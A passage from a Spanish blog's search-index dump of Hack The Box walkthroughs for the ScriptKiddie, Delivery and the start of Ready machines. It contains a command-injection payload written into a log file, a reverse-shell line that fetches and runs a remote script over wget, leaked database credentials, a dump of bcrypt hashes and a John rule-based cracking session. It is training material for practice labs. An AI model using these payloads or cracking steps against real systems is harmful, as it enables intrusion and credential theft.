venom(request): errors = [] file = None if not \u0026#39;lhost\u0026#39; in request.form: errors.append(\u0026#39;lhost missing\u0026#39;) else: lhost = request.form[\u0026#39;lhost\u0026#39;] if not regex_ip.match(lhost): errors.append(\u0026#39;invalid lhost ip\u0026#39;) if not \u0026#39;os\u0026#39; in request.form: errors.append(\u0026#39;os missing\u0026#39;) else: tar_os = request.form[\u0026#39;os\u0026#39;] if tar_os not in [\u0026#39;windows\u0026#39;, \u0026#39;linux\u0026#39;, \u0026#39;android\u0026#39;]: errors.append(f\u0026#39;invalid os: {tar_os}\u0026#39;) if \u0026#39;template\u0026#39; in request.files and request.files[\u0026#39;template\u0026#39;].filename != \u0026#39;\u0026#39;: file = request.files[\u0026#39;template\u0026#39;] if not (\u0026#39;.\u0026#39; in file.filename and file.filename.split(\u0026#39;.\u0026#39;)[-1] == OS_2_EXT[tar_os]): errors.append(f\u0026#39;{tar_os} requires a {OS_2_EXT[tar_os]} ext template file\u0026#39;) else: template_name = secure_filename(file.filename) template_ext = file.filename.split(\u0026#39;.\u0026#39;)[-1] template_file = tempfile.NamedTemporaryFile(\u0026#39;wb\u0026#39;, suffix=\u0026#39;.\u0026#39;+template_ext) file.save(template_file.name) else: template_name = \u0026#34;None\u0026#34; if errors: return render_template(\u0026#39;index.html\u0026#39;, payloaderror=\u0026#39;\u0026lt;br/\u0026gt;\\n\u0026#39;.join(errors)) payload = f\u0026#39;{tar_os}/meterpreter/reverse_tcp\u0026#39; outfilename = md5(request.remote_addr.encode()).hexdigest()[:12] + \u0026#39;.\u0026#39; + OS_2_EXT[tar_os] outfilepath = os.path.join(app.root_path, \u0026#39;static\u0026#39;, \u0026#39;payloads\u0026#39;, outfilename) try: if file: print(f\u0026#39;msfvenom -x {template_file.name} -p {payload} LHOST={lhost} LPORT=4444\u0026#39;) result = subprocess.check_output([\u0026#39;msfvenom\u0026#39;, \u0026#39;-x\u0026#39;, template_file.name, \u0026#39;-p\u0026#39;, payload, f\u0026#39;LHOST={lhost}\u0026#39;, \u0026#39;LPORT=4444\u0026#39;, \u0026#39;-o\u0026#39;, outfilepath]) template_file.close() else: result = subprocess.check_output([\u0026#39;msfvenom\u0026#39;, \u0026#39;-p\u0026#39;, payload, f\u0026#39;LHOST={lhost}\u0026#39;, \u0026#39;LPORT=4444\u0026#39;, \u0026#39;-o\u0026#39;, outfilepath]) except subprocess.CalledProcessError: return render_template(\u0026#39;index.html\u0026#39;, payloaderror=\u0026#34;Something went wrong\u0026#34;) return render_template(\u0026#39;index.html\u0026#39;, payload=payload, lhost=lhost, lport=4444, template=template_name, fn=outfilename) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;)   PWN - USER Realizamos una enumeracion en la carpeta del usuario pwn y encontramos un script el cual realiza la lectura de direcciones IP o lo que contenga el archivo log que se encuentra en la carpeta de kid y escanea 10 puertos de las distintas direcciones en segundo plano, guardandolas en un archivo por separado.\n1 2 3 4 5 6 7 8 9 10  #!/bin/bash  log=/home/kid/logs/hackers cd /home/pwn/ cat $log | cut -d\u0026#39; \u0026#39; -f3- | sort -u | while read ip; do sh -c \u0026#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip}2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026#34; \u0026amp; done if [[ $(wc -l \u0026lt; $log) -gt 0 ]]; then echo -n \u0026gt; $log; fi   Despues de dar vueltas por la maquina no encontramos algo de ayuda para cambiar al usuario pwn, pero en el codigo fuente de la aplicacion tambien se encontraba el archivo de log en donde realiza la escritura de la direccion IP que intentó \u0026ldquo;vulnerar\u0026rdquo; la aplicacion (stop hacking me - well hack you back), por lo que quizas este archivo solo se ejecuta cada vez que alguien intenta \u0026ldquo;vulnerar\u0026rdquo; la aplicacion.\n1 2 3 4 5 6 7 8  def searchsploit(text, srcip): if regex_alphanum.match(text): result = subprocess.check_output([\u0026#39;searchsploit\u0026#39;, \u0026#39;--color\u0026#39;, text]) return render_template(\u0026#39;index.html\u0026#39;, searchsploit=result.decode(\u0026#39;UTF-8\u0026#39;, \u0026#39;ignore\u0026#39;)) else: with open(\u0026#39;/home/kid/logs/hackers\u0026#39;, \u0026#39;a\u0026#39;) as f: f.write(f\u0026#39;[{datetime.datetime.now()}] {srcip}\\n\u0026#39;) return render_template(\u0026#39;index.html\u0026#39;, sserror=\u0026#34;stop hacking me - well hack you back\u0026#34;)   Utilizamos pspy para verificar si este archivo era ejecutado, confirmamos que dicho archivo se ejecuta y lo hace el usuario pwn.\nDe cierta forma debemos de ejecutar comandos ingresando estos en el archivo /home/kid/logs/hackers para que scanlosers.sh lo ejecute, lo hacemos ingresando una fecha como lo hace la aplicacion o cualquier otra cosa pero que contenga un espacio y una direccion IP agregando nuestro comando entre punto y coma y finalizar con numeral (IP; comando ;#) de tal forma que cuando el archivo ejecute el escaneo a la direccion ip tambien ejecute nuestro comando y no ejecute lo demás.\n1 2 3 4 5 6 7 8  #Original #sh -c \u0026#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026#34; \u0026amp; #[2021-02-07 02:06:28.242343] 127.0.0.1; id ;# sh -c \u0026#34;nmap --top-ports 10 -oN recon/127.0.0.1; id ;#.nmap 127.0.0.1;id; 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026#34; \u0026amp; #Ejecucion nmap --top-ports 10 -oN recon/127.0.0.1; id ;#   Agregamos nuestro comando de ejecucion de shell inversa al archivo hackers. Generamos el mensaje (stop hacking me - well hack you back) ingresando algun caracter como - en la busqueda de searchsploit para que ejecute nuestra shell inversa con lo que logramos obtener nuestra shell con el usuario pwn.\n# echo \u0026quot;useless words 127.0.0.1; bash -c \u0026quot;$(wget -qO- 10.10.14.166/shell.sh);#\u0026quot; \u0026gt; /home/kid/logs/hackers useless words 127.0.0.1; bash -c \u0026quot;$(wget -qO- 10.10.14.166/shell.sh);# PRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando /opt/metasploit-framework-6.0.9/msfconsole. Ejecutamos msfconsole y logramos obtener una \u0026ldquo;shell\u0026rdquo; con usuario root y nuestra flag root.txt.\n","description":"ScriptKiddie es una maquina con dificultad Facil, obtuvimos acceso mediante la creacion de una plantilla apk para inyeccion de comandos. Mediante el analisis de codigo de la aplicacion web y scripts ejecutados por esta, realizamos una inyeccion de comandos para obtener acceso a un segundo usuario. Finalmente para obtener acceso como superusuario utilizamos los permisos sudo para ejecutar metasploit.","id":6,"section":"posts","tags":["msfvenom","pspy","apk template injection","metasploit","android"],"title":"Hack The Box - ScriptKiddie","uri":"https://sckull.github.io/posts/scriptkiddie/"},{"content":"  Delivery expone osTicket el cual nos permitio registrarnos en Mattermost, en este ultimo encontramos credenciales, utilizamos estas para acceder por SSH. Enumeramos la base de datos con credenciales de un archivo de configuracion encontramos hashes que crackeamos con un Wordlist personalizado utilizando reglas de John con informacion de Mattermost, con ello logramos escalar privilegios.\nInformacion de la Maquina    Nombre Delivery      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.222   Maker ippsec    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6, 5.5, 3.9, 6.1, 4.5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra el puerto http (80), ssh (22) y el puerto 8065 abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86  # Nmap 7.80 scan initiated Wed Feb 10 18:30:51 2021 as: nmap -p- --min-rate 1000 -T4 -oN allports delivery.htb Warning: 10.10.10.222 giving up on port because retransmission cap hit (6). Nmap scan report for delivery.htb (10.10.10.222) Host is up (0.076s latency). Not shown: 57054 closed ports, 8478 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8065/tcp open unknown # Nmap done at Wed Feb 10 18:33:37 2021 -- 1 IP address (1 host up) scanned in 166.34 seconds # Nmap 7.80 scan initiated Wed Feb 10 18:34:08 2021 as: nmap -p 22,80,8065 -sV -sC -oN serviceports delivery.htb Nmap scan report for delivery.htb (10.10.10.222) Host is up (0.44s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA) | 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA) |_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome 8065/tcp open unknown | fingerprint-strings: | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Accept-Ranges: bytes | Cache-Control: no-cache, max-age=31556926, public | Content-Length: 3108 | Content-Security-Policy: frame-ancestors \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; cdn.rudderlabs.com | Content-Type: text/html; charset=utf-8 | Last-Modified: Wed, 10 Feb 2021 17:44:49 GMT | X-Frame-Options: SAMEORIGIN | X-Request-Id: t3i5h6aemfgxj8mhzygap77tdo | X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false | Date: Wed, 10 Feb 2021 23:37:10 GMT | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;robots\u0026#34; content=\u0026#34;noindex, nofollow\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;no-referrer\u0026#34;\u0026gt;\u0026lt;title\u0026gt;Mattermost\u0026lt;/title\u0026gt;\u0026lt;meta name=\u0026#34;mobile-web-app-capable\u0026#34; content=\u0026#34;yes\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;application-name\u0026#34; content=\u0026#34;Mattermost\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;format-detection\u0026#34; content=\u0026#34;telephone=no\u0026#34;\u0026gt;\u0026lt;link re | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Date: Wed, 10 Feb 2021 23:37:11 GMT |_ Content-Length: 0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8065-TCP:V=7.80%I=7%D=2/10%Time=60246D78%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x SF:20Request\u0026#34;)%r(GetRequest,DF3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nAccept-Ranges:\\ SF:x20bytes\\r\\nCache-Control:\\x20no-cache,\\x20max-age=31556926,\\x20public\\ SF:r\\nContent-Length:\\x203108\\r\\nContent-Security-Policy:\\x20frame-ancesto SF:rs\\x20\u0026#39;self\u0026#39;;\\x20script-src\\x20\u0026#39;self\u0026#39;\\x20cdn\\.rudderlabs\\.com\\r\\nConten SF:t-Type:\\x20text/html;\\x20charset=utf-8\\r\\nLast-Modified:\\x20Wed,\\x2010\\ SF:x20Feb\\x202021\\x2017:44:49\\x20GMT\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\n SF:X-Request-Id:\\x20t3i5h6aemfgxj8mhzygap77tdo\\r\\nX-Version-Id:\\x205\\.30\\. SF:0\\.5\\.30\\.1\\.57fb31b889bf81d99d8af8176d4bbaaa\\.false\\r\\nDate:\\x20Wed,\\x SF:2010\\x20Feb\\x202021\\x2023:37:10\\x20GMT\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x SF:20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;viewport SF:\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,initial-scale=1,maximum-scale=1,user SF:-scalable=0\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;robots\\\u0026#34;\\x20content=\\\u0026#34;noindex,\\x20nofollo SF:w\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;referrer\\\u0026#34;\\x20content=\\\u0026#34;no-referrer\\\u0026#34;\u0026gt;\u0026lt;title\u0026gt;Matter SF:most\u0026lt;/title\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;mobile-web-app-capable\\\u0026#34;\\x20content=\\\u0026#34;yes\\\u0026#34; SF:\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;application-name\\\u0026#34;\\x20content=\\\u0026#34;Mattermost\\\u0026#34;\u0026gt;\u0026lt;meta\\x20 SF:name=\\\u0026#34;format-detection\\\u0026#34;\\x20content=\\\u0026#34;telephone=no\\\u0026#34;\u0026gt;\u0026lt;link\\x20re\u0026#34;)%r(H SF:TTPOptions,5B,\u0026#34;HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nDate:\\x2 SF:0Wed,\\x2010\\x20Feb\\x202021\\x2023:37:11\\x20GMT\\r\\nContent-Length:\\x200\\r SF:\\n\\r\\n\u0026#34;)%r(RTSPRequest,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConten SF:t-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n SF:400\\x20Bad\\x20Request\u0026#34;)%r(Help,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close SF:\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(SSLSessionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x2 SF:0Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nCon SF:nection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TerminalServerCookie SF:,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain; SF:\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34; SF:); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 10 18:35:45 2021 -- 1 IP address (1 host up) scanned in 97.53 seconds   HTTP Encontramos una pagina corriendo en el puerto 80 la cual muestra un nuevo subdominio helpdesk.delivery.htb y un link de referencia hacia el puerto 8065 de MatterMost server. En la pagina menciona que debemos de tener una cuenta en helpdesk para acceder a Mattermost (Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server.).\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos, pero la pagina al parecer solo es una pagina estatica sin más.\n1 2 3 4 5 6 7 8 9 10 11 12  [?] Started at\t: 2021-02-10 18:38:43 GET\t200 OK\thttp://delivery.htb/ GET 200 OK http://delivery.htb/index.html GET 301 Moved Permanently http://delivery.htb/images =\u0026gt; http://delivery.htb/images/ GET 301 Moved Permanently http://delivery.htb/assets =\u0026gt; http://delivery.htb/assets/ GET 301 Moved Permanently http://delivery.htb/error =\u0026gt; http://delivery.htb/error/ GET 200 OK http://delivery.htb/ [?] Ended at: 2021-02-10 21:28:42   Mattermost En el puerto 8065 encontramos el login de Mattermost.\nUSER osTicket Con el nuevo subdominio agregado a nuestro archivo /etc/hosts encontramos osTicket, osTicket es un sistema de soporte que administra solicitudes de soporte, y, por usuario crea un email para que éste pueda revisar el status del ticket enviado, al investigar posibles vulnerabilidades encontramos una: SSRF aunque no es fue de ayuda.\nosTicket \u0026gt; Mattermost En la pagina \u0026ldquo;estatica\u0026rdquo; se mencionaba que para aquellos usuarios que no se han registrado, deben realizarlo a traves de HelpDesk (helpdesk.delivery.htb - osTicket), una vez registrado pueden acceder a MatterMost, por lo que creamos un ticket en osTicket, al finalizar, nos muestra un mensaje con el id del ticket y un correo generado.\nEl correo \u0026ldquo;generado\u0026rdquo; es el que debemos de utilizar para crear nuestra cuenta en MatterMost, MatterMost enviará el link de activacion a nuestro \u0026lsquo;ticket\u0026rsquo; en osTicket.\nSi verificamos el ticket (utilizando el correo con el que se registro el ticket y el id del ticket generado) vemos que recibimos el correo con el link para activar la cuenta.\nIngresamos a MatterMost y vemos el unico chat publico con algunos comentarios, en donde mencionan las credenciales del servidor, y que, se desarrolle un programa para que se dejen de reutilizar contraseñas especialmente los que contengan \u0026quot;PleaseSubscribe!\u0026quot;, tambien que si alguien logran obtener los hashes, facilmente puede obtener en texto plano el valor del hash utilizando reglas de hashcat.\nosTicket Panel Ingresamos al panel (de agentes) de osTicket utilizando las credenciales encontradas en MatterMost donde vemos la lista de tickets creados, en este panel no encontramos mucho por hacer.\nSSH Utilizamos las credenciales en el servicio de SSH donde logramos obtener una shell y nuestra flag user.txt.\nROOT Realizamos una enumeracion y vemos que mysql está corriendo en el puerto 3306, además encontramos las credenciales para la base de datos de osTicket, al ingresar vemos la informacion perteneciente a osTicket.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  maildeliverer@Delivery:/var/www/osticket/upload$ cat ./include/ost-config.php \u0026lt;?php [... REDACTED ...] # Encrypt/Decrypt secret key - randomly generated during installation. define(\u0026#39;SECRET_SALT\u0026#39;,\u0026#39;nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3\u0026#39;); #Default admin email. Used only on db connection issues and related alerts. define(\u0026#39;ADMIN_EMAIL\u0026#39;,\u0026#39;maildeliverer@delivery.htb\u0026#39;); # Database Options # --------------------------------------------------- # Mysql Login info define(\u0026#39;DBTYPE\u0026#39;,\u0026#39;mysql\u0026#39;); define(\u0026#39;DBHOST\u0026#39;,\u0026#39;localhost\u0026#39;); define(\u0026#39;DBNAME\u0026#39;,\u0026#39;osticket\u0026#39;); define(\u0026#39;DBUSER\u0026#39;,\u0026#39;ost_user\u0026#39;); define(\u0026#39;DBPASS\u0026#39;,\u0026#39;!H3lpD3sk123!\u0026#39;); [... REDACTED ...]   Tambien encontramos la configuracion y credenciales de la base de datos de MatterMost, en la base de datos encontramos contraseñas encriptadas de los usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68  maildeliverer@Delivery:/opt/mattermost/config$ cat config.json [... REDACTED ...] \u0026#34;SqlSettings\u0026#34;: { \u0026#34;DriverName\u0026#34;: \u0026#34;mysql\u0026#34;, \u0026#34;DataSource\u0026#34;: \u0026#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\u0026#34;, \u0026#34;DataSourceReplicas\u0026#34;: [], \u0026#34;DataSourceSearchReplicas\u0026#34;: [], \u0026#34;MaxIdleConns\u0026#34;: 20, \u0026#34;ConnMaxLifetimeMilliseconds\u0026#34;: 3600000, \u0026#34;MaxOpenConns\u0026#34;: 300, \u0026#34;Trace\u0026#34;: false, \u0026#34;AtRestEncryptKey\u0026#34;: \u0026#34;n5uax3d4f919obtsp1pw1k5xetq1enez\u0026#34;, \u0026#34;QueryTimeout\u0026#34;: 30, \u0026#34;DisableDatabaseSearch\u0026#34;: false }, [... REDACTED ...] MariaDB [mattermost]\u0026gt; describe Users; +--------------------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +--------------------+--------------+------+-----+---------+-------+ | Id | varchar(26) | NO | PRI | NULL | | | CreateAt | bigint(20) | YES | MUL | NULL | | | UpdateAt | bigint(20) | YES | MUL | NULL | | | DeleteAt | bigint(20) | YES | MUL | NULL | | | Username | varchar(64) | YES | UNI | NULL | | | Password | varchar(128) | YES | | NULL | | | AuthData | varchar(128) | YES | UNI | NULL | | | AuthService | varchar(32) | YES | | NULL | | | Email | varchar(128) | YES | UNI | NULL | | | EmailVerified | tinyint(1) | YES | | NULL | | | Nickname | varchar(64) | YES | | NULL | | | FirstName | varchar(64) | YES | | NULL | | | LastName | varchar(64) | YES | | NULL | | | Position | varchar(128) | YES | | NULL | | | Roles | text | YES | | NULL | | | AllowMarketing | tinyint(1) | YES | | NULL | | | Props | text | YES | | NULL | | | NotifyProps | text | YES | | NULL | | | LastPasswordUpdate | bigint(20) | YES | | NULL | | | LastPictureUpdate | bigint(20) | YES | | NULL | | | FailedAttempts | int(11) | YES | | NULL | | | Locale | varchar(5) | YES | | NULL | | | Timezone | text | YES | | NULL | | | MfaActive | tinyint(1) | YES | | NULL | | | MfaSecret | varchar(128) | YES | | NULL | | +--------------------+--------------+------+-----+---------+-------+ 25 rows in set (0.002 sec) MariaDB [mattermost]\u0026gt; MariaDB [mattermost]\u0026gt; select Username, Password, Email, Nickname from Users; +----------------------------------+--------------------------------------------------------------+-------------------------+----------+ | Username | Password | Email | Nickname | +----------------------------------+--------------------------------------------------------------+-------------------------+----------+ | surveybot | | surveybot@localhost | | | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | 4120849@delivery.htb | | | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | 7466068@delivery.htb | | | sckull | $2a$10$AP5Rh.y5nEnGdbYFaZpTU.eSogx.U4k1dYqnGik3HGdD4HPjD/miK | sckull@sckull.com | | | root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | root@delivery.htb | | | spirit | $2a$10$38hHVUzGTxHmKQ.QKQtRGuiT1cdmjUOo/QXUJZjK1zJGJMVpmObWC | 4300590@delivery.htb | | | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | 9122359@delivery.htb | | | channelexport | | channelexport@localhost | | | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | 5056505@delivery.htb | | +----------------------------------+--------------------------------------------------------------+-------------------------+----------+ 10 rows in set (0.001 sec)   JOHN + RULES \u0026gt; SHELL Como bien el usuario root daba a entender que reutilizaban contraseñas y menciona PleaseSubscribe!, utilizamos john y la regla Jumbo para crear un diccionario a partir de esta palabra, ejecutamos john con este nuevo diccionario y logramos encontrar una contraseña la cual utilizamos para obtener una shell con el usuario root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  kali@kali:~/htb/delivery$ echo \u0026#34;PleaseSubscribe!\u0026#34; \u0026gt; part_pass kali@kali:~/htb/delivery$ cat part_pass PleaseSubscribe! kali@kali:~/htb/delivery$ kali@kali:~/htb/delivery$ john --wordlist:part_pass --rules:Jumbo --stdout \u0026gt; possible.txt Using default input encoding: UTF-8 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 70166p 0:00:00:00 100.00% (2021-02-11 00:04) 779622p/s PeSubs kali@kali:~/htb/delivery$ wc -l possible.txt 70166 possible.txt kali@kali:~/htb/delivery$ john --wordlist:possible.txt hash_root Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status PleaseSubscribe!21 (?) 1g 0:00:11:39 DONE (2021-02-11 00:05) 0.001430g/s 100.2p/s 100.2c/s 100.2C/s pleaseSubscribe!..PleaseSubscriman Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed kali@kali:~/htb/delivery$   ","description":"Delivery expone osTicket el cual nos permitio registrarnos en Mattermost, en este ultimo encontramos credenciales, utilizamos estas para acceder por SSH. Enumeramos la base de datos con credenciales de un archivo de configuracion encontramos hashes que crackeamos con un Wordlist personalizado utilizando reglas de John con informacion de Mattermost, con ello logramos escalar privilegios.","id":7,"section":"posts","tags":["rustbuster","mattermost","osTicket","john","john rules"],"title":"Hack The Box - Delivery","uri":"https://sckull.github.io/posts/delivery/"},{"content":"  En Ready encontramos una version de GitLab con una vulnerabilidad que aprovechamos para obtener acceso en un contenedor de Docker. Escalamos privilegios con contraseñas almacenadas, tras una enumeracion encontramos que el contenedor de Docker tiene la flag privileged activado lo que nos dio acceso como root en el Host.\nInformacion de la Maquina    Nombre Ready      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.220   Maker bertolis    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[5.8, 5.7, 6.6, 3.4, 4.3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra el puerto ssh (22) y el puerto http (5080) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  # Nmap 7.91 scan initiated Tue Feb 16 18:21:59 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.220 Warning: 10.10.10.220 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.220 (10.10.10.220) Host is up (0.098s latency). Not shown: 43467 closed ports, 22066 filtered ports PORT STATE SERVICE 22/tcp open ssh 5080/tcp open onscreen # Nmap done at Tue Feb 16 18:23:06 2021 -- 1 IP address (1 host up) scanned in 66.86 seconds # Nmap 7.91 scan initiated Tue Feb 16 18:23:31 2021 as: nmap -p 22,5080 -sV -sC -oN serviceports 10.10.10.220 Nmap scan report for 10.10.10.220 (10.10.10.220) Host is up (0.070s latency). PORT STATE SERVICE VERSION 22/tcp open ssh 